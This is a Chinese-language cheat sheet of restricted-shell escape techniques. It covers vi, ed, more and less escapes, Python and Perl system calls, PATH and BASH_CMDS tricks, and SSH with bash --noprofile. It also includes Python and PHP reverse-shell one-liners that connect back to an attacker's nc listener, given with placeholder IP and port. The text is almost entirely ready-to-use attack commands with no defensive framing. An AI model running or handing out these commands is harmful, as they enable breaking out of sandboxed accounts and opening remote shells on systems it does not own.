## 编辑器绕过

### vi编辑器

在命令行输入 vi ，在末行输入 :set shell=/bin/bash
接着在执行命令 :shell 

### ed编辑器

>ed
>!'/bin/bash'

## 编程语言绕过

### Python

>python3 -c 'import os; os.system("/bin/bash");'

### Perl

>perl -e 'system("/bin/bash");'

## 反弹shell 绕过

### Python反弹

攻击机

> nc -lvp

靶机

>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### Php反弹

攻击机

>nc -lvp

靶机

>php -r '$sock=fsockopen("LISTENING IP",LISTENING PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

## 利用二进制文件绕过

### more

> ! 'sh'

### less

>less a.txt

末行模式输入 

>!'sh'

## Expect 绕过

>expect
>export -p        //查看环境变量
BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
/bin/bash
export PATH=$PATH:/bin/         //添加环境变量
export PATH=$PATH:/usr/bin      //添加环境变量

提权成功


## SSH绕过

>ssh text@192.168.1.1 -t "bash --noprofile"




